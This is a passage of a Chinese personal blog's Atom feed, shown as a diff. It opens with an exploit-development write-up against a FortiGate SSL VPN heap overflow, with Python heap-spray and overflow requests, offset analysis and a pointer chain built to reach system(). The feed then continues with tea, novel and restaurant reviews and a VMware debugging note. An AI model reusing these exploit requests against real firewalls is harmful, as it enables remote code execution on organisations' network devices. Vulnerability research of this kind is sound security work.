+data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
+ssock2.sendall(data)
+</code></pre>
+<p>第一个请求是为了布置堆</p>
+<p>第二个请求使用一开始计算的4120，在0x0a0d覆盖后下断点查看情况</p>
+<p>根据之前的梳理，<code>sub_16E6130</code>就是漏洞所在处，此处<code>0x0a0d</code>完成覆盖，选择在<code>0x17f5af6</code>处后下断点</p>
+<figure data-type="image" tabindex="14"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240530170835871.png?x-oss-process=style/zip" alt="image-20240530170835871" loading="lazy"></figure>
+<h6 id="写入地址错误">写入地址错误</h6>
+<p>发现因为大端的问题，0x0a0d写入地址错误</p>
+<figure data-type="image" tabindex="15"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531131055713.png?x-oss-process=style/zip" alt="image-20240531131055713" loading="lazy"></figure>
+<h6 id="堆喷失败">堆喷失败</h6>
+<p>尝试进行调整，但调整成功以后发现没能成功喷到</p>
+<figure data-type="image" tabindex="16"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531142725059.png?x-oss-process=style/zip" alt="image-20240531142725059" loading="lazy"></figure>
+<p>这里和同门讨论了一下，他用的另一种方法，溢出点不同，填充字符数量为4137，我尝试了一下确实成功了</p>
+<h6 id="探究原因">探究原因</h6>
+<p>尝试探究了一下具体原因，根据我们一开始堆喷的思路，a1指针的低字节被覆盖成<code>\r\n</code>后，可以恰好指向预先布置好的内存。这里我简单画了个图：</p>
+<figure data-type="image" tabindex="17"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531144339860.png?x-oss-process=style/zip" alt="image-20240531144339860" loading="lazy"></figure>
+<p>为实现这一效果，需要达成如下条件：</p>
+<ol>
+<li>a1结构体地址比堆喷区域地址更高，并且二者间隔很小。</li>
+<li><code>0x7fxxxxxxx0a0d</code>一定指向伪造的结构体。</li>
+</ol>
+<p>我重新看了一下<code>r13</code>的地址和<code>rbp</code>寄存器，根据之前的调试经验，寄存器中地址在此处相对固定，跟<code>r13</code>相近的地址大概有如下几处</p>
+<figure data-type="image" tabindex="18"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531140149721.png?x-oss-process=style/zip" alt="image-20240531140149721" loading="lazy"></figure>
+<p>也就是说，可用的偏移只有4137、4133、4121，这里我使用4121重新尝试了一下</p>
+<p>一开始堆喷没有成功喷到，堆喷成功率确实不是非常稳定</p>
+<figure data-type="image" tabindex="19"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531132325247.png?x-oss-process=style/zip" alt="image-20240531132325247" loading="lazy"></figure>
+<p>继续尝试，成功劫持结构体</p>
+<figure data-type="image" tabindex="20"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240531140721537.png?x-oss-process=style/zip" alt="image-20240531140721537" loading="lazy"></figure>
+<p>又用4137尝试了一下，也能成功劫持</p>
+<figure data-type="image" tabindex="21"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240530162220602.png?x-oss-process=style/zip" alt="image-20240530162220602" loading="lazy"></figure>
+<p>这样就可以可靠地将r13指针重定向到能够控制的缓冲区。然后填充缓冲区，实现远程代码执行。</p>
+<p>最终劫持请求如下</p>
+<pre><code>import socket
+import ssl
+import time
+
+def create_ssock(hostname, port):
+    context = ssl._create_unverified_context()
+    sock = socket.create_connection((hostname, port))
+    ssock = context.wrap_socket(sock, server_hostname=hostname)
+    return ssock
+
+TARGET = '192.168.150.9'
+PORT = 10443
+ssock1 = create_ssock(TARGET, PORT)
+
+body = (b&quot;A&quot;*1901 + b&quot;=&quot; + b&quot;B&quot;*1901 + b&quot;&amp;&quot;)*15
+
+
+data = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += b&quot;Content-Length: &quot; + str(len(body)).encode(&quot;utf-8&quot;) + b&quot;\r\n&quot;
+data += b&quot;\r\n&quot;
+data += body
+
+ssock1.sendall(data)
+
+time.sleep(1)
+ssock2 = create_ssock(TARGET, PORT)
+
+data  = b&quot;POST / HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.1.229\r\n&quot;
+data += b&quot;Transfer-Encoding: chunked\r\n&quot;
+data += b&quot;\r\n&quot;
+data += b&quot;0&quot;*4121 + b&quot;\0&quot;
+#data += b&quot;0&quot;*4140 + b&quot;\0&quot;
+data += b&quot;A&quot;*1 + b&quot;\r\n\r\n&quot;
+ssock2.sendall(data)
+</code></pre>
+<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
+.plt:000000000043FDF0 _system         endp
+</code></pre>
+<pre><code>000000000180AAAE                 mov     r13, [rdi+298h]
+
+000000000180AAC3                 mov     r15, [r13+70h]
+
+000000000180AAFD                 mov     rax, [rax+r15+20h]
+
+000000000180AB0B                 call    rax
+</code></pre>
+<pre><code>.plt:000000000043FDF0                 jmp     cs:off_42616F8
+.plt:000000000043FDF0 _system         endp
+
+.got.plt:00000000042616F8 off_42616F8     dq offset system        ; DATA XREF: _system↑r
+</code></pre>
+<p>这是最后一次解引用，所以我们有以下内容，分为两个步骤。</p>
+<pre><code>tmp0 = rax + r15 + 0x20 (0x042616F8)
+rax  = *tmp0            (0x0043FDF0)
+call rax
+</code></pre>
+<p>我们使用调试器逐步检查了代码，发现rax在这一点上通常是0x20，因此我们可以将其简化为以下内容。</p>
+<pre><code>tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<pre><code>tmp1 = r13 + 0x70 (0x00432F70)
+r15  = *tmp1      (0x042616B8)
+tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<p>0x042616F8-0x40=0x042616B8</p>
+<figure data-type="image" tabindex="22"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607141340616.png?x-oss-process=style/zip" alt="image-20240607141340616" loading="lazy"></figure>
+<p>最后一步意味着我们只需要在rdi + 0x298处写入0x00432F00。因为我们控制了rdi指向的地方，所以应该没有问题。</p>
+<pre><code>tmp2 = rdi + 0x298
+r13  = *tmp2      (0x00432F00)
+tmp1 = r13 + 0x70 (0x00432F70)
+r15  = *tmp1      (0x042616B8)
+tmp0 = r15 + 0x40 (0x042616F8)
+rax  = *tmp0      (0x0043FDF0)
+call rax
+</code></pre>
+<pre><code>system_ptr = b&quot;%00%2f%43%00%00%00%00%00&quot; # 0x00432F00
+body = (b&quot;B&quot;*1165 + system_ptr + b&quot;B&quot;*713 + b&quot;=&amp;&quot;)*25
+
+data  = b&quot;POST /remote/hostcheck_validate HTTP/1.1\r\n&quot;
+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += f&quot;Content-Length: {len(body)}\r\n&quot;.encode(&quot;utf-8&quot;)
+data += b&quot;\r\n&quot;
+data += body
+</code></pre>
+<p>一开始没能成功堆喷</p>
+<figure data-type="image" tabindex="23"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607142926726.png?x-oss-process=style/zip" alt="image-20240607142926726" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607145049053.png?x-oss-process=style/zip" alt="image-20240607145049053" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150557994.png?x-oss-process=style/zip" alt="image-20240607150557994" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150656418.png?x-oss-process=style/zip" alt="image-20240607150656418" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150831110.png?x-oss-process=style/zip" alt="image-20240607150831110" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240607150936603.png?x-oss-process=style/zip" alt="image-20240607150936603" loading="lazy"></figure>
+<p>成功走到call system，后面的步骤感觉就是和前两个漏洞一样，找gadget构造ROP，基本一致</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[茶叶尝试]]></title>
+        <id>https://blog.augustu.top/post/tea/</id>
+        <link href="https://blog.augustu.top/post/tea/">
+        </link>
+        <updated>2024-04-20T14:19:26.000Z</updated>
+        <content type="html"><![CDATA[<p>​	前几天偶然在小黑盒上看到一个有关东方树叶的帖子下面有人很用心的推荐了一些茶叶，描述的不错，我对茶叶一直很感兴趣，可惜之前喝过的茶叶都比较一般，非常想尝试一下，按照楼主的建议，买了最少的20g的量，尝试了几种茶叶。</p>
+<h2 id="文新信阳毛尖">文新·信阳毛尖</h2>
+<p>​	这个是他推荐的其中一种，第一个，没说多好，我记错评价了，对其抱有了很大的期待，尝试了一下只能说可以，因为是第一个到的，我想给三颗星，做一个标准吧，感觉便宜一点的话可以常买，但我买的20g一罐29，这个价格不好说。</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/f18fb64c4c2cae056091d22363a735b.jpg?x-oss-process=style/zip" alt="f18fb64c4c2cae056091d22363a735b" loading="lazy"></figure>
+<h3 id="特点">特点</h3>
+<ul>
+<li>
+<p>汤感</p>
+<p>​	真的有茶汤的感觉，有点厚重，非常神奇，然后就是正常的茶叶的味道吧，没有什么让我特别惊艳的</p>
+</li>
+<li>
+<p>回甘微弱</p>
+<p>​	我看B站视频里说温度过高的话，入口先会苦涩会有回甘，温度合适不会苦涩，回甘也会更淡，可惜我并没有体验到，可能是我尝试按照盖碗泡茶的方式，没能充分释放茶叶中的物质吗？但当我泡了比较长的时间，也没有体验到，也可能是价位的问题？</p>
+</li>
+<li>
+<p>不耐泡</p>
+<p>​	基本四次左右，就没有什么味道了</p>
+</li>
+</ul>
+<h2 id="研茶苑漳平水仙">研茶苑·漳平水仙</h2>
+<p>​	这茶是楼主着重推荐的，我尝试了一下，想给它四颗星</p>
+<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/880a258700eb165d8be52fa6786b76d.jpg?x-oss-process=style/zip" alt="880a258700eb165d8be52fa6786b76d" style="zoom: 50%;" />
+<h3 id="特点-2">特点</h3>
+<ul>
+<li>
+<p>香气</p>
+<p>​	香气非常明显，虽然没有到视频中吹嘘的那种沸水浇下去，满室生香的程度，但是坐在座位上，茶杯放在鼠标垫最前端也能轻易闻到淡淡的香气，凑近了更加明显。这个香气我不知道怎么形容，只能说确实比较高雅，原谅我没有闻过水仙的香气，是否真的和水仙的香气很像呢？</p>
+</li>
+<li>
+<p>耐泡</p>
+<p>​	因为获得的最美工位的奖品——一个很适合泡茶的杯子，我基本泡个十来秒就拿开，然后等茶冷掉喝茶——继续泡、等、喝茶。这个流程持续了大概一天，到现在犹有香气，应该算是很耐泡了，我估计五六泡差不多。</p>
+</li>
+<li>
+<p>不入水</p>
+<p>​	虽然很香，但是茶喝下去口感和香气并没有什么关系。茶水入口，只是正常的茶叶口感，帖子里说有的茉莉茶香气不入水，不知道是不是这种。</p>
+</li>
+<li>
+<p>有余香</p>
+<p>​	喝完了呼吸时仍感觉有淡淡余香，不知道是不是心理作用</p>
+</li>
+</ul>
+<h2 id="张一元茉莉白毛猴">张一元·茉莉白毛猴</h2>
+<p>​	这款也是被着重推荐的，楼主形容为“香气入水，整个屋都是香的”，很奇怪，淘宝42还要付10元运费，京东42，plus32，加运费42，刚刚下单，不知道味道如何，期待。</p>
+<h3 id="特点-3">特点</h3>
+<ul>
+<li>
+<p>茉莉花香</p>
+<p>茉莉花的香气很重，泡茶的时候就可以很明显的闻到，比漳平水仙浓很多，泡出来离得远点也能闻到淡淡的花香味儿</p>
+</li>
+<li>
+<p>口感</p>
+<p>喝着没什么味道，像是没有甜味儿的茉莉清茶，完了味道还要淡一点</p>
+</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[vmware 双机联调 不能下端点 debug 问题]]></title>
+        <id>https://blog.augustu.top/post/vmware-debug/</id>
+        <link href="https://blog.augustu.top/post/vmware-debug/">
+        </link>
+        <updated>2024-01-19T12:04:11.000Z</updated>
+        <content type="html"><![CDATA[<p>在复现CVE-2022-42475 FortiGate 防火墙 漏洞时遇到了一个问题</p>
+<p>跟着<a href="https://forum.butian.net/share/2166">CVE-2022-42475 FortiGate SSLVPN 堆溢出漏洞分析与利用</a>和<a href="https://i3r0nya.cn/wiki/note/reverse/cve-2022-42475/">CVE-2022-42475 复现研究</a>、<a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">CVE-2022-42475</a>做了前面的环境准备和提取二进制等工作后在通过patch绕过文件系统校验这一步卡住了</p>
+<h2 id="具体情况">具体情况</h2>
+<p>使用vmlinux-to-elf将flatkc文件转换为elf文件后，使用gdb加载，再target remote进行远程连接后在call fgt_verify处下断点，但只要开始c那么FortiGate虚拟机就会直接关闭</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240119151002626.png?x-oss-process=style/zip" alt="image-20240119151002626" loading="lazy"></figure>
+<p>这个问题困扰了我们很长时间，刚刚算了一下，到现在快两个月了，终于找到了解决方法</p>
+<h2 id="解决方法">解决方法</h2>
+<p>关闭hyper-v和Device Guard</p>
+<ul>
+<li>
+<p>禁用Device Guard或Credential Guard</p>
+<ol>
+<li>在主机操作系统上，右键单击“<strong>开始”</strong> &gt; <strong>“运行”</strong>，键入gpedit.msc，然后单击“ **确定”。**本地组策略编辑器打开。</li>
+<li>转至<strong>本地计算机策略</strong> &gt; <strong>计算机配置</strong> &gt; <strong>管理模板&gt;系统</strong> &gt;<strong>Device Guard（或者是： 设备防护）</strong> &gt; <strong>启用基于虚拟化的安全性</strong>。</li>
+<li>选择<strong>已禁用</strong>。</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240119150736191.png?x-oss-process=style/zip" alt="image-20240119150736191" loading="lazy"></figure>
+</li>
+<li>
+<p><strong>以管理员身份运行Windows Powershell (管理员)（Windows键+X）</strong></p>
+<p>​    运行下面命令并重启电脑：</p>
+<pre><code class="language-cobol">bcdedit /set hypervisorlaunchtype off
+</code></pre>
+</li>
+</ul>
+<p>这时候再进行尝试的话，一句话，怎么调怎么有</p>
+<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240119143653223.png?x-oss-process=style/zip" alt="image-20240119143653223" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/image-20240119144850038.png?x-oss-process=style/zip" alt="image-20240119144850038" loading="lazy"></figure>
+<h2 id="原因探究">原因探究</h2>
+<p>我查看了Microsoft的官方文档介绍，这个也就是他说的<code>内存完整性</code>的另一个名字，对于这个内存完整性，文档介绍是</p>
+<blockquote>
+<p><strong>内存完整性</strong> 是 Windows 中提供的基于虚拟化的安全 (VBS) 功能。 内存完整性和 VBS 改进了 Windows 的威胁模型，并针对试图利用 Windows 内核的恶意软件提供更强大的保护。 VBS 使用 Windows 虚拟机监控程序创建独立的虚拟环境，该环境成为假定内核可能遭到入侵的 OS 的信任根。 内存完整性是一个关键组件，它通过在 VBS 的独立虚拟环境中运行内核模式代码完整性来保护和强化 Windows。 内存完整性还限制可用于破坏系统的内核内存分配。</p>
+</blockquote>
+<blockquote>
+<h2 id="内存完整性功能">内存完整性功能</h2>
+<ul>
+<li>保护内核模式驱动程序的控制流防护 (CFG) 位图的修改。</li>
+<li>保护内核模式代码完整性进程，确保其他受信任的内核进程具有有效的证书。</li>
+</ul>
+</blockquote>
+<p>第一个功能，我找了几篇介绍CFG的文章看了一下，感觉是为了防止对内核模式驱动程序的控制流进行恶意修改。如果我尝试在虚拟机内通过修改控制流来影响内核模式驱动程序，内存完整性功能可能会检测到这样的修改，然后结束这个进程，造成我虚拟机直接退出的情况，我觉得是很有可能的</p>
+<p>第二个功能我不太了解进程证书的情况，不知道会不会产生什么影响</p>
+<p>但总的来说，在一个虚拟机里用GDB连接到另一个虚拟机，而且还在它启动的时候改内存，感觉触发内存完整性功能的检测还是挺有可能的，因为这涉及对内核模式代码的操作，尤其是对控制流的修改，也刚好能解释为什么不下断点能够正常运行，因为并没有修改控制流</p>
+<p>然后我尝试了再次开启hyper-v，在内存完整性关闭的情况下，仍然会同样断开</p>
+<p>Hyper-V 利用硬件虚拟化技术（如Intel VT-x或AMD-V）来提高虚拟机性能，并支持在虚拟机中运行受保护的内核模式代码。虚拟化本身引入了一些额外的层次，可能会影响对内存和控制流的访问，之前VMware官方人员要求关闭也不是没有理由的。</p>
+<h2 id="辛酸历程">辛酸历程</h2>
+<p>简单回顾一下这段时间的辛酸历程，我都不太相信我能成功了</p>
+<p>最后都想买个失败总是贯穿人生始终放桌子上了，终于，还是没有被贯穿到底</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[《新顺1730》简评]]></title>
+        <id>https://blog.augustu.top/post/shun1730-review/</id>
+        <link href="https://blog.augustu.top/post/shun1730-review/">
+        </link>
+        <updated>2022-10-18T08:59:59.000Z</updated>
+        <content type="html"><![CDATA[<p>​	《新顺》完结了，我当时应该是前几个看到最新的完结章节的，事实上我并没有多么急于追更，更大的原因可能是到后面看的人越来越少，虽然很多粉丝吹作者的议论很好，更有甚者说就喜欢看这个，当然，不排除有这种人，但按照我后期的追读体验，看的人越来越少了。这其中的原因有多方面的，刚好可以引出它的缺点。</p>
+<h2 id="摘录">摘录</h2>
+<p>​</p>
+<p>失落、衰败、不满，每当这种时候，多数人不是向前看，而是向后看，寻找过去历史上真实存在过的救星，然后将这种情感转移到能够披着尸骨和旧皮的人身上。</p>
+<p>盛世，从不是个好词。</p>
+<p>只有经历过开元繁华、又经历过安史之乱的人，才能理解什么是盛世。</p>
+<p>在天宝十四年冬月之前就死掉的人，根本不可能理解盛世这个词的真正滋味，那是一瓶回韵悠长的老醴，不是一抔痛饮欢歌的烈酒。</p>
+<p>盛世不是十一二点钟的太阳。盛世是傍晚山巅的西霞。</p>
+<p>摇摇摆摆，往前走也难受、往后退还难受、一动不动仍旧难受。可偏偏又不肯放下天下只管自己，恐有一股子道之所在虽千万人吾往矣的精神头却不知道道在哪。</p>
+<p>大顺的二月末，也很冷，也会下雪。</p>
+<p>汨罗江的水和巫山的云，本在大顺。</p>
+<p>被丢到边疆的狼群，他们会嗅到这里面的冲鼻的血腥。</p>
+<p>一旦压在他们头顶的、让他们一直恐惧的、唯一不敢仰视的那群人或是死去、或是消散、或是隐居、或是撕下面具、或者只是老了露出了一丝优柔。</p>
+<p>一旦这个欣欣向荣、充满希望、勃勃生机的世界开始停滞。</p>
+<p>就像是许多年前的大梁城，仰慕信陵君的那个不读书的少年游侠。</p>
+<p>那个不读书的少年，瑟缩在那股世间至强的力量之下，蛰伏于阴影之中，甘心去做一个亭长。</p>
+<p>可那股世间至强的力量，也有老去的一天，也有消亡的一日。</p>
+<p>对他们而言，即便是松苏这些年崛起的、富可敌国的新兴阶层，他们依旧不屑，觉得不过如此，不过是乘风而起，可取而代之。</p>
+<p>反对之前，要先三省吾身：</p>
+<p>我有亲戚是六政府尚书吗？</p>
+<p>我有关系能靠到天佑殿吗？</p>
+<p>我祖上是跟着太宗皇帝打天下的勋贵吗？</p>
+<p>若都不是，傻子都能干的买卖，凭什么轮到自己呢？</p>
+<p>一千年的文华，毁于一旦。</p>
+<p>一千年的风物，化为丘墟。</p>
+<p>彼时青年的他又怎么会记得这番没滋味的句子？既没有刀剑，也没有血光。</p>
+<h2 id="车轱辘话">车轱辘话</h2>
+<p>​	毫无疑问的，后半段是大段大段的论述，这当然会赶跑一部分人，但在中后期我看的还是非常开心的，喜欢键政的朋友估计也对此非常喜欢，但为啥到后期人越来越少呢？虽然很多人说作者就是为了这口醋包的这碗饺子，但在我看来，写到最后部分的时候，作者的醋不够了，可以说，后半部分大部分都是醋，一群山西人兴高采烈的喝着，但慢慢的，醋没了，掌柜的不断在醋里面加水，甚至到最后就是昨天的陈水。</p>
+<p>​	简单来说，我后面看的感受是，每天都在重复昨天看过的东西，车轱辘话翻来覆去的说，说第一遍有新意，深得我心，第二遍加深记忆，不是不行，但第二百遍我就真的受不了了，赤鸡在公众号里说有书友在书评区崩溃，但事实上看到后面的书友并不会因为单纯的议论文而崩溃，大家就是奔着这个来的，怎么会厌倦呢？事实上，崩溃的原因，或者我看到的，大部分都是在质问为啥还写这个</p>
+<p>​	说实话，我可以理解作者，不知道大家注意没有，望舒的更新还是相当稳定的，少有断更，大部分时候竟然一天两章，中后期高强度输出，到后面没话可讲实属正常，但宁愿车轱辘话也坚持不断更可能更降低了可读性吧，不加事件一味重复输出相同观点，还不加点叙事一味议论，属实让人受不了</p>
+<p>​	但说作者只会写议论显然不对，前半部故事性同样很好，后面同样偶尔有非常适应场景形势的妙语出现，只能说作者志不在此吧</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[墨西哥餐厅食后感]]></title>
+        <id>https://blog.augustu.top/post/mexican-restaurant/</id>
+        <link href="https://blog.augustu.top/post/mexican-restaurant/">
+        </link>
+        <updated>2022-03-26T08:59:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="墨西哥餐厅食后感">墨西哥餐厅食后感</h2>
+<p>进去以后可能是时间不对，店里非常冷清，只有两个人。</p>
+<p>我们先点了杯气泡水，名字太长记不住了</p>
+<figure data-type="image" tabindex="1"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202203261619222.jpg" alt="" loading="lazy"></figure>
+<p>颜值还是可以的，拍的不是很好，一朵花在粉红色的气泡水里，美丽典雅，但里面2/3是冰，哈哈</p>
+<p>!<img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/202203261625266.jpg" alt="" loading="lazy"></p>
+<p>小吃拼盘，还行，一般</p>
+<figure data-type="image" tabindex="2"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313225159.jpg" alt="img" loading="lazy"></figure>
+<p>面包，硬硬的，有点咸了</p>
+<figure data-type="image" tabindex="3"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313232016.jpg" alt="IMG_20210313_181248" loading="lazy"></figure>
+<p>薄饼，不错，里面有那种水果的口感，一口咬下去果汁都在嘴里流出，伴着里面的肉一起咀嚼，非常不错，我吃的不是很习惯，以前很少吃过这种肉和水果混在一起，口感几乎区分不出的食物</p>
+<figure data-type="image" tabindex="4"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313232224.jpg" alt="img" loading="lazy"></figure>
+<p>蜗牛，说实话刚端上来我整个人都不好了，味儿太冲了，尝了一下，口感真不错，像是大号的螺狮，但是软一点，很Q弹，但是味道是真的不行，也许是我欣赏不来墨西哥的口味，感觉都有种刺激性气体的味道了，尝了两个实在受不了了</p>
+<figure data-type="image" tabindex="5"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313233052.jpg" alt="img" loading="lazy"></figure>
+<p>蔬菜沙拉，咸的一批，口感还行，不是很喜欢</p>
+<figure data-type="image" tabindex="6"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313233139.jpg" alt="img" loading="lazy"></figure>
+<p>塔克，感觉和龙哥的煎饼没啥区别，但是真不错，上面的白色酱料味道很淡，奶油的口感却一点都不腻，里面的牛肉味道非常好，搭配起来相得益彰，是我最满意的一道菜</p>
+<figure data-type="image" tabindex="7"><img src="https://augustu.oss-cn-beijing.aliyuncs.com/img/20210313225142.jpg" alt="img" loading="lazy"></figure>
+<p>牛排，真的一般，一点都不嫩，筋也比较多，但切的时候可以看到渗出的肌红蛋白，吃起来感觉也很一般，没有那种没熟的感觉，但也不是很嫩。</p>
+]]></content>
+    </entry>
+</feed>
